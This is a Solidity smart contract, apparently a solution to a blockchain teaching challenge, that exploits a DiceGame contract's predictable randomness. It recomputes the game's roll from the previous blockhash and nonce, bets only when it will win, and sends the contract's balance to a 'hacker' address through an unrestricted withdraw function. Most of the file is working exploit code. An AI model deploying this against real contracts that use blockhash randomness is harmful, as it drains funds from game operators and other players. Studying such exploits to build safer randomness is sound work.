pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;
    address public hacker;

    event Roll(address indexed player, uint256 roll);

    constructor(address payable diceGameAddress, address payable _hacker) {
        diceGame = DiceGame(diceGameAddress);
        hacker = _hacker;
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw() public {
        (bool success, ) = payable(address(hacker)).call{
            value: address(this).balance
        }("");
        require(success, "failed");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner

    function riggedRoll() public {
        // check the roll number
        bytes32 prevHash = blockhash(block.number - 1);
        // console.log("RIGGED: block.number: ", block.number);
        // console.log(
        //     "RIGGED: prevHash: ",
        //     Strings.toHexString(uint256(prevHash), 32)
        // );
        uint256 nonce = diceGame.nonce();

        // console.log("RIGGED: nonce: ", nonce);

        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), nonce)
        );

        // console.log(
        //     "RIGGED: Generated hash",
        //     Strings.toHexString(uint256(hash), 32)
        // );
        // console.log("RIGGED: uint256(hash): ", uint256(hash));

        uint256 roll = uint256(hash) % 16;
        // uint256 roll = 2;

        emit Roll(msg.sender, roll);

        // console.log("PREDICTED  ROLL IS ", roll);
        if (roll < 3) {
            diceGame.rollTheDice{value: 0.03 ether}();
        }
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}
